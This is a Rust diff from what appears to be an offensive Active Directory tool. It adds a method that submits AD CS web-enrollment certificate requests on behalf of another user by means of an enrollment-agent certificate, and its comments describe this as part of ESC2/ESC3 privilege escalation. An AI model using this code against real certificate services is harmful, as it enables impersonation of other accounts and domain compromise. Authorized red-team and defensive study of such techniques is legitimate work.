@@ -152,6 +152,59 @@ impl WebEnrollmentClient {
             .await
     }
 
+    /// Submit a certificate request on behalf of another user (enrollment agent).
+    /// Used for ESC3 and ESC2 escalation where an enrollment agent certificate
+    /// is used to request a certificate for a different principal.
+    pub async fn submit_request_on_behalf(
+        &self,
+        csr_der: &[u8],
+        template: &str,
+        target_upn: &str,
+        agent_cert_der: &[u8],
+    ) -> Result<CertificateResponse> {
+        info!(
+            "Submitting certificate request on behalf of {} for template {}",
+            target_upn, template
+        );
+
+        let csr_b64 = base64::engine::general_purpose::STANDARD.encode(csr_der);
+        let agent_b64 = base64::engine::general_purpose::STANDARD.encode(agent_cert_der);
+
+        let form_data = vec![
+            ("Mode", "newreq".to_string()),
+            ("CertRequest", csr_b64),
+            (
+                "CertAttrib",
+                format!("CertificateTemplate:{}\nupn:{}", template, target_upn),
+            ),
+            ("TargetStoreFlags", "0".to_string()),
+            ("SaveCert", "yes".to_string()),
+            ("AgentCertificate", agent_b64),
+        ];
+
+        let url = format!("{}/certfnsh.asp", self.base_url());
+
+        debug!("Submitting on-behalf request to: {}", url);
+
+        let response = self
+            .http_client
+            .post(&url)
+            .form(&form_data)
+            .send()
+            .await
+            .map_err(|e| OverthroneError::Connection {
+                target: url.clone(),
+                reason: format!("On-behalf request failed: {}", e),
+            })?;
+
+        let status = response.status();
+        let body = response.text().await.unwrap_or_default();
+
+        debug!("On-behalf request response status: {}", status);
+
+        self.parse_response(&body, status)
+    }
+
     /// Submit a certificate request with enrollment agent certificate (for ESC3)
     pub async fn submit_request_with_agent(
         &self,
